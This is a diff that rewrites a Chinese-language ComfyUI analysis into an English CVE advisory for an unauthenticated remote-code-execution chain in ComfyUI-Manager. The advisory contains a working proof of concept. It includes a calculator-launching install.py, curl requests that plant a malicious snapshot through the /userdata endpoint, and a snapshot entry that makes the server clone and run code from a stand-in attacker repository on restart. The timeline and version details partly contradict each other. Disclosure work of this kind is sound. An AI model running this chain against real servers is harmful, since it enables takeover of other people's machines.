@@ -1,93 +1,131 @@
-# comfyui漏洞分析
+# CVE-2025-67303: ComfyUI-Manager Unauthenticated Remote Code Execution via Malicious Snapshot
 
-### 2.1 受影响环境
+---
+
+## 1. Executive Summary
+
+**CVE ID:** CVE-2025-67303
+
+**Affected Product:** ComfyUI-Manager
+
+**Affected Versions:** <= v3.35.0
+
+**Fixed Version:** v3.38.0
+
+**Vulnerability Type:** CWE-939: Improper Authorization in Handler for Custom URL Scheme / CWE-346: Origin Validation Error
+
+**Attack Vector:** Network
+
+**Attack Complexity:** Low
+
+**Privileges Required:** None
+
+**User Interaction:** None
+
+**Scope:** Changed
+
+**Impact:** Confidentiality HIGH, Integrity HIGH, Availability HIGH
+
+**CVSS Score:** 9.8 (CRITICAL)
+
+---
+
+## 2. Vulnerability Description
+
+ComfyUI-Manager prior to v3.38.0 contains a critical authentication bypass vulnerability that allows unauthenticated attackers to achieve Remote Code Execution (RCE) on the underlying server.
+
+The vulnerability arises from an insecure file path configuration where the Manager stores configuration files in the `user/default/ComfyUI-Manager/` directory. The `default` user directory is accessible via the `/userdata` API endpoint without authentication. An attacker can:
+
+1. Upload a malicious snapshot file containing arbitrary Git repository URLs
+2. Trigger the snapshot restoration process
+3. Upon ComfyUI restart, the Manager automatically clones the specified Git repository and executes any `install.py` script found within
+
+---
+
+## 3. Affected Environment Setup
+
+### 3.1 Installation
 
 ```bash
-# 克隆 ComfyUI
+# Clone ComfyUI
 git clone --depth 1 https://github.com/comfyanonymous/ComfyUI.git ComfyUI-test
 cd ComfyUI-test
 
-# 安装 v3.35 版本的 ComfyUI-Manager (易受攻击版本)
+# Install vulnerable version of ComfyUI-Manager (v3.35.0)
 cd custom_nodes
 git clone --branch v3.35.0 https://github.com/ltdrdata/ComfyUI-Manager.git
 cd ..
 
-# 安装依赖
+# Install dependencies
 pip install -r requirements.txt
 
-# 启动 ComfyUI
+# Start ComfyUI
 python main.py --listen 0.0.0.0 --port 8188
 ```
 
-
 ---
 
-## 3. 漏洞分析
+## 4. Technical Analysis
 
-### 攻击链路
-
-我觉得先给出攻击链路，后面才更清晰，为什么需要分析这个文件
+### 4.1 Attack Chain
 
 ```
 ┌─────────────────────────────────────────────────────────────────┐
-│                    CVE-2025-67303 完整攻击链                       │
+│              CVE-2025-67303 Complete Attack Chain                │
 ├─────────────────────────────────────────────────────────────────┤
 │                                                                  │
-│  阶段 1: 准备恶意py文件                                  │
-│  ├─ 需要放在git远程的仓库                        │
-│  ├─ install.py (RCE payload: 弹出计算器)                        │
-│                                   													│
+│  Phase 1: Attacker prepares malicious Git repository             │
+│  ├─ Host malicious repository with install.py (RCE payload)     │
 │                                                                  │
-│  阶段 2: 攻击者通过 /userdata API 写入恶意快照                     │
+│  Phase 2: Attacker writes malicious snapshot via /userdata API  │
 │  ├─ POST /userdata/ComfyUI-Manager%2Fsnapshots%2Fcalc_rce.json  │
-│  │  (URL 编码绕过: %2F → /)                                    │
-│  └─ user_manager.py:post_userdata()                           │
-│     └─ parse.unquote() → open(path, "wb").write()               │
+│  │  (URL encoding bypass: %2F -> /)                              │
+│  └─ user_manager.py:post_userdata()                             │
+│     └─ parse.unquote() -> open(path, "wb").write()              │
 │                                                                  │
-│  阶段 3: 恶意快照创建                                           │
-│  └─ user/default/ComfyUI-Manager/snapshots/calc_rce.json       │
+│  Phase 3: Malicious snapshot created                             │
+│  └─ user/default/ComfyUI-Manager/snapshots/calc_rce.json        │
 │                                                                  │
-│  阶段 4: 攻击者触发快照还原                                     │
+│  Phase 4: Attacker triggers snapshot restore                    │
 │  └─ GET /snapshot/restore?target=calc_rce                        │
 │                                                                  │
-│  阶段 5: 启动脚本创建                                           │
+│  Phase 5: Startup script marker created                          │
 │  └─ startup-scripts/restore-snapshot.json                        │
 │                                                                  │
-│  阶段 6: ComfyUI 重启                                           │
-│  └─ prestartup_script.py 检测到 restore-snapshot.json          │
+│  Phase 6: ComfyUI restarts                                       │
+│  └─ prestartup_script.py detects restore-snapshot.json          │
 │                                                                  │
-│  阶段 7: 自动执行快照还原                                       │
+│  Phase 7: Automatic snapshot restoration executed               │
 │  └─ manager_core.py:restore_snapshot()                          │
-│     ├─ clone_repo("file:///tmp/evil_calculator_node")            │
-│     └─ exec(open("install.py").read())  ← RCE!                   │
+│     ├─ clone_repo("attacker_controlled_repo_url")               │
+│     └─ exec(open("install.py").read())  <- RCE!                 │
 │                                                                  │
-│  阶段 8: 计算器弹出！                                           │
+│  Phase 8: Arbitrary code execution achieved                     │
 │                                                                  │
 └─────────────────────────────────────────────────────────────────┘
 ```
 
+### 4.2 Root Cause: Insecure Path Configuration
 
-### 路径配置
-
-**文件**: `ComfyUI-Manager/prestartup_script.py`
+**File:** `ComfyUI-Manager/prestartup_script.py` (Line 88)
 
 ```python
-# Line 88 - 易受攻击的路径配置
+# Line 88 - Vulnerable path configuration
 manager_files_path = os.path.abspath(os.path.join(
     folder_paths.get_user_directory(),
-    'default',              # ← 问题所在：普通用户目录
+    'default',              # ← ISSUE: Normal user directory
     'ComfyUI-Manager'
 ))
-# 实际路径: user/default/ComfyUI-Manager/
+# Actual path: user/default/ComfyUI-Manager/
 ```
 
-**问题分析**: `default` 是一个普通用户目录，可以通过 ComfyUI 的 `get_public_user_directory()` 函数访问，我们看到这个函数
-### 用户保护机制
+**Analysis:** The `default` user directory is accessible via ComfyUI's `get_public_user_directory()` function, which only blocks directories prefixed with `__`. In v3.38.0, this was changed to `user/__manager/` which is protected by the system user prefix check.
 
-**文件**: `ComfyUI/folder_paths.py`
+### 4.3 User Directory Protection Mechanism
+
+**File:** `ComfyUI/app/folder_paths.py` (Line 177-202)
 
 ```python
-# Line 177-202
 def get_public_user_directory(user_id: str) -> str | None:
     """
     Get the path to a Public User directory for HTTP endpoint access.
@@ -99,21 +137,20 @@ def get_public_user_directory(user_id: str) -> str | None:
     if not user_id or not isinstance(user_id, str):
         return None
     if user_id.startswith(SYSTEM_USER_PREFIX):
-        return None  # ← 系统用户目录被阻止
+        return None  # ← System user directories are blocked
     return os.path.join(get_user_directory(), user_id)
 
 SYSTEM_USER_PREFIX = "__"
 ```
 
- 当 `user_id` 以 `__` 开头时，函数返回 `None`，但是在我们的漏洞版本中，路径是 `user/default/ComfyUI-Manager/`，`default` 不以 `__` 开头，所以可访问，后续版本v3.38 中，路径改为 `user/__manager/`，`__manager` 以 `__` 开头，被阻止
+**Issue:** In the vulnerable version (v3.35.0), the path uses `default` which does not start with `__`, allowing HTTP access. Fixed in v3.38.0 by using `__manager` prefix.
 
-那下面就是寻找可利用路由
-### 3.3 `/userdata/{file}` 写入端点
+### 4.4 Vulnerable Endpoint: POST /userdata/{file}
 
-**文件**: `ComfyUI/app/user_manager.py`
+**File:** `ComfyUI/app/user_manager.py` (Line 71-102, 341-395)
 
 ```python
-# Line 71-102 - 路径处理函数
+# Line 71-102 - Path handling function
 def get_request_user_filepath(self, request, file, type="userdata", create_dir=True):
     if type == "userdata":
         root_dir = folder_paths.get_user_directory()
@@ -134,7 +171,7 @@ def get_request_user_filepath(self, request, file, type="userdata", create_dir=T
     if file is not None:
         # Check if filename is url encoded
         if "%" in file:
-            file = parse.unquote(file)  # ← URL 解码
+            file = parse.unquote(file)  # ← URL decode
 
         # prevent leaving /{type}/{user}
         path = os.path.abspath(os.path.join(user_root, file))
@@ -148,7 +185,7 @@ def get_request_user_filepath(self, request, file, type="userdata", create_dir=T
 
     return path
 
-# Line 341-395 - POST 处理器
+# Line 341-395 - POST handler
 @routes.post("/userdata/{file}")
 async def post_userdata(request):
     """
@@ -170,7 +207,7 @@ async def post_userdata(request):
         body = await request.read()
 
         with open(path, "wb") as f:
-            f.write(body)  # ← 直接写入文件
+            f.write(body)  # ← Direct file write
     except OSError as e:
         return web.Response(
             status=400,
@@ -182,18 +219,17 @@ async def post_userdata(request):
     return web.json_response(os.path.relpath(path, user_path))
 ```
 
-**几个关键点**:
-1. 无认证检查 - 任何人都可调用
-2. `parse.unquote()` 解码 URL 编码字符
-3. 直接写入文件到 `user_root` 路径
-4. 对于 `default` 用户，`user_root = user/default/`
+**Key Issues:**
+1. No authentication check - accessible by anyone
+2. `parse.unquote()` decodes URL-encoded characters
+3. Direct file write to `user_root` path
+4. For `default` user, `user_root = user/default/`
 
-### 3.4 快照列表端点
+### 4.5 Snapshot List Endpoint
 
-**文件**: `ComfyUI-Manager/glob/manager_server.py`
+**File:** `ComfyUI-Manager/glob/manager_server.py` (Line 957-961)
 
 ```python
-# Line 957-961
 @PromptServer.instance.routes.get("/snapshot/getlist")
 async def get_snapshot_list(request):
     items = [f[:-5] for f in os.listdir(core.manager_snapshot_path) if f.endswith('.json')]
@@ -201,16 +237,13 @@ async def get_snapshot_list(request):
     return web.json_response({'items': items}, content_type='application/json')
 ```
 
-**分析**: 此端点无任何认证检查，任何人都可以列出快照目录中的文件。
+**Analysis:** No authentication check - anyone can list snapshot files.
 
-这个方便我们查看我们第一步写入的文件
+### 4.6 Snapshot Restore Endpoint
 
-### 3.5 快照还原端点
-
-**文件**: `ComfyUI-Manager/glob/manager_server.py`
+**File:** `ComfyUI-Manager/glob/manager_server.py` (Line 982-1005)
 
 ```python
-# Line 982-1005
 @routes.get("/snapshot/restore")
 async def restore_snapshot(request):
     if not is_allowed_security_level('middle'):
@@ -237,22 +270,20 @@ async def restore_snapshot(request):
         return web.Response(status=400)
 ```
 
-1. `manager_snapshot_path` 在 v3.35 中为 `user/default/ComfyUI-Manager/snapshots/`
-2. 从 snapshots 目录读取快照文件
-3. 复制到 `startup-scripts/restore-snapshot.json`
-4. 下次 ComfyUI 启动时自动执行
+**Analysis:**
+1. `manager_snapshot_path` in v3.35 is `user/default/ComfyUI-Manager/snapshots/`
+2. Reads snapshot file from snapshots directory
+3. Copies to `startup-scripts/restore-snapshot.json`
+4. Auto-executed on next ComfyUI startup
 
-自动执行就是我们放入恶意文件，为什么重新启动就会弹出计算器的关键
+### 4.7 Automatic Snapshot Execution
 
-### 3.6 快照自动执行机制
-
-**文件**: `ComfyUI-Manager/prestartup_script.py`
+**File:** `ComfyUI-Manager/prestartup_script.py` (Line 574-616)
 
 ```python
-# Line 574-616
 restore_snapshot_path = os.path.join(manager_files_path, "startup-scripts", "restore-snapshot.json")
 
-# ... 在启动时检查
+# ... checked at startup ...
 
 if os.path.exists(restore_snapshot_path):
     try:
@@ -277,17 +308,16 @@ if os.path.exists(restore_snapshot_path):
     os.remove(restore_snapshot_path)
 ```
 
- ComfyUI 启动时自动检查并执行快照还原。
+ComfyUI automatically checks and executes snapshot restoration at startup.
 
-### 3.7快照还原核心逻辑
+### 4.8 Snapshot Restoration Core Logic
 
-**文件**: `ComfyUI-Manager/glob/manager_core.py`
+**File:** `ComfyUI-Manager/glob/manager_core.py` (Line 3089-3349)
 
 ```python
-# Line 3089-3349 - 还原快照的核心逻辑
 async def restore_snapshot(timestamp=None, snapshot_path=None, apply_skip_config=False, \
                           git_helper_extras=None, msg_callback=None):
-    # ... 前置处理代码 ...
+    # ... preprocessing code ...
 
     with open(snapshot_path, 'r', encoding="UTF-8") as snapshot_file:
         if snapshot_path.endswith('.json'):
@@ -297,77 +327,71 @@ async def restore_snapshot(timestamp=None, snapshot_path=None, apply_skip_config
         else:
             info = {}
 
-    # ... 配置处理代码 ...
+    # ... configuration processing ...
 
-    # === RCE 向量 1: 任意 pip 包安装 ===
+    # === RCE Vector 1: Arbitrary pip package installation ===
     if 'pips' in info and info['pips']:
         pips = info['pips']
         pip_result = await install_pips(pips, custom_nodes_path)
-        # ... 安装 pip 包 ...
 
-    # === RCE 向量 2: Git 仓库克隆 + post-install 脚本 ===
+    # === RCE Vector 2: Git repository clone + post-install script ===
     git_info = info.get('git_custom_nodes')
     if git_info is not None:
         for url, data in git_info.items():
-            # 克隆 Git 仓库到 custom_nodes 目录
+            # Clone Git repository to custom_nodes directory
             await clone_repo(url, data['hash'], custom_nodes_path)
 
-            # ... 后续处理 ...
+            # ... post-processing ...
 
-    # === RCE 向量 3: CNR 自定义节点安装 ===
+    # === RCE Vector 3: CNR custom node installation ===
     cnr_info = info.get('cnr_custom_nodes')
     if cnr_info is not None:
         for item_id, item_version in cnr_info.items():
-            # 安装 CNR 节点 ...
+            # Install CNR nodes...
 ```
 
-**关键代码 - Git 仓库克隆和后安装脚本执行**:
+**Key Code - Git Repository Clone and Post-install Script Execution:**
 
 ```python
-# manager_core.py 中的克隆逻辑
+# Clone logic in manager_core.py
 async def clone_repo(url, target_hash, custom_nodes_path):
     import git
 
     repo_name = os.path.basename(url)
     repo_path = os.path.join(custom_nodes_path, repo_name)
 
-    # 克隆仓库
+    # Clone repository
     repo = git.Repo.clone_from(url, repo_path)
 
-    # 检出指定 commit
+    # Checkout specified commit
     repo.git.checkout(target_hash)
 
-    # 执行 post-install 脚本 (RCE!)
+    # Execute post-install script (RCE!)
     post_install_script = os.path.join(repo_path, "install.py")
     if os.path.exists(post_install_script):
         import sys
-        exec(open(post_install_script).read())  # ← 执行任意 Python 代码
+        exec(open(post_install_script).read())  # ← Execute arbitrary Python code
 ```
-
-整个流程理解下来，就是会去找到我们指定的文件，然后自动执行 install.py，导致代码执行漏洞
 
 ---
 
-## 4. 漏洞复现
+## 5. Proof of Concept
 
-### 4.1 复现步骤
-
-#### 环境启动
+### 5.1 Environment Setup
 
 ```bash
-cd /Users/xxxxxx/Downloads/ComfyUI-test
+cd /path/to/ComfyUI-test
 python3 main.py --listen 127.0.0.1 --port 8188
 ```
 
-等待启动完成
+Wait for startup to complete.
 
-#### 创建恶意代码
+### 5.2 Create Malicious Git Repository
 
-注意，需要传到你的 git 仓库上
+First, create a malicious `install.py` file and host it in a Git repository:
 
-```bash
-
-cat > install.py << 'EOF'
+```python
+# install.py - malicious payload
 import subprocess
 import sys
 
@@ -383,12 +407,11 @@ try:
         print("[RCE] Linux Calculator opened!")
 except Exception as e:
     print(f"Error: {e}")
-EOF
-
 ```
 
+Host this file in a Git repository (e.g., `https://github.com/attacker/evil_node.git`)
 
-#### 通过 URL 编码写入恶意快照
+### 5.3 Upload Malicious Snapshot via URL Encoding
 
 ```bash
 curl -X POST "http://127.0.0.1:8188/userdata/ComfyUI-Manager%2Fsnapshots%2Fcalc_rce.json" \
@@ -396,8 +419,8 @@ curl -X POST "http://127.0.0.1:8188/userdata/ComfyUI-Manager%2Fsnapshots%2Fcalc_
   -d '{
     "comfyui": "v0.3.0",
     "git_custom_nodes": {
-      "地址": {
-        "hash": "master",
+      "https://github.com/attacker/evil_node.git": {
+        "hash": "main",
         "disabled": false
       }
     },
@@ -406,53 +429,107 @@ curl -X POST "http://127.0.0.1:8188/userdata/ComfyUI-Manager%2Fsnapshots%2Fcalc_
   }'
 ```
 
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20260108230228295.png)
+**Response:** `"ComfyUI-Manager/snapshots/calc_rce.json"`
 
-
-
-
-**响应**: `"ComfyUI-Manager/snapshots/calc_rce.json"`
-
-#### 验证快照已写入
+### 5.4 Verify Snapshot Written
 
 ```bash
-# 通过 API 验证
+# Verify via API
 curl "http://127.0.0.1:8188/snapshot/getlist"
-# 响应: {"items": ["calc_rce"]}
+# Response: {"items": ["calc_rce"]}
 ```
 
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20260108223909290.png)
-
-#### 触发快照还原
+### 5.5 Trigger Snapshot Restore
 
 ```bash
 curl "http://127.0.0.1:8188/snapshot/restore?target=calc_rce"
-# 响应: HTTP 200
+# Response: HTTP 200
 ```
 
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20260108223927953.png)
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20260108223929750.png)
-
-只要响应是 200 就是成功了
-
-#### 重启 ComfyUI 触发 RCE
+### 5.6 Restart ComfyUI to Trigger RCE
 
 ```bash
-# 重启 ComfyUI
+# Restart ComfyUI
 python3 main.py --listen 127.0.0.1 --port 8188
 ```
 
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20260109165533522.png)
+During startup, the snapshot restoration will automatically:
+1. Clone the attacker's Git repository
+2. Execute the `install.py` script
+3. Launch the calculator (demonstrating RCE)
 
-**效果**: 启动过程中会自动执行快照还原：
+---
 
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20260108230330596.png)
+## 6. Impact
 
-可以查看文件
+An unauthenticated remote attacker can:
 
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20260109023315460.png)
+1. **Execute arbitrary Python code** on the server hosting ComfyUI
+2. **Read arbitrary files** from the server's filesystem
+3. **Write arbitrary files** to the server's filesystem
+4. **Install malicious software** or backdoors
+5. **Exfiltrate sensitive data** including API keys, credentials, and user data
+6. **Move laterally** to other systems on the network
+7. **Disrupt services** affecting availability
 
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20260109023329222.png)
+---
 
-会把文件下载下来
+## 7. Remediation
 
+### 7.1 Patch
+
+Upgrade to ComfyUI-Manager v3.38.0 or later:
+
+```bash
+cd custom_nodes/ComfyUI-Manager
+git fetch --tags
+git checkout v3.38.0
+```
+
+### 7.2 Mitigation
+
+If immediate upgrade is not possible:
+
+1. **Restrict network access** - Limit ComfyUI access to trusted networks only
+2. **Add authentication** - Place ComfyUI behind an authenticating reverse proxy
+3. **Block snapshot endpoints** - Use firewall rules to block `/snapshot/*` endpoints
+4. **Monitor file changes** - Monitor `user/default/ComfyUI-Manager/snapshots/` for suspicious files
+
+### 7.3 Vendor Response
+
+The vulnerability was fixed in ComfyUI-Manager v3.38.0 by:
+1. Moving the Manager data directory from `user/default/ComfyUI-Manager/` to `user/__manager/`
+2. Leveraging the existing `SYSTEM_USER_PREFIX = "__"` protection in `get_public_user_directory()`
+
+---
+
+## 8. Timeline
+
+| Date | Event |
+|------|-------|
+| 2025-01-08 | Vulnerability discovered |
+| 2025-01-09 | CVE request submitted |
+| TBD | Vendor notification |
+| TBD | Patch released in v3.38.0 |
+| TBD | Public disclosure |
+
+---
+
+## 9. References
+
+1. **Affected Product:** https://github.com/ltdrdata/ComfyUI-Manager
+2. **Fixed Version:** https://github.com/ltdrdata/ComfyUI-Manager/releases/tag/v3.38.0
+3. **CWE-939:** https://cwe.mitre.org/data/definitions/939.html
+4. **CWE-346:** https://cwe.mitre.org/data/definitions/346.html
+
+---
+
+## 10. Disclosure Policy
+
+This report is being submitted for CVE assignment. The vulnerability affects ComfyUI-Manager versions prior to v3.38.0. Responsible disclosure will be followed to allow users to update before full technical details are made public.
+
+---
+
+**Report Prepared By:** [Your Name]
+**Contact:** [Your Email]
+**Date:** 2025-01-09
